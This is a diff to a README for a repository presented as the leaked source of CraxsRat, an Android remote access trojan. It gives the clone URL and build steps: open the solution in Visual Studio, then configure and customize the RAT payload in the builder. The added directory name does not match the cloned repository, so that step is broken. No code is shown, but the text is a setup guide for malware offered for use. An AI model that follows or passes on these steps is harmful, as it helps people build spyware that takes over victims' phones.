@@ -121,10 +121,11 @@ This repository contains the leaked source code of CraxsRat, a sophisticated And
 1. **Clone the Repository**:
    ```sh
    git clone https://github.com/maxamin/CraxsRat-v6.8-Source-LEAK.git
-   cd craxsrat-source-code
+   cd raxsRat-v6.8-Source-LEAK
    ```
 
-2. **Builder Configuration**:
+2. **Open it with vs & Builder Configuration**:
+   - Open the project .sln file with vs
    - Follow the instructions in the builder directory to set up and configure the RAT payload.
    - Customize the payload to suit your specific requirements.
 
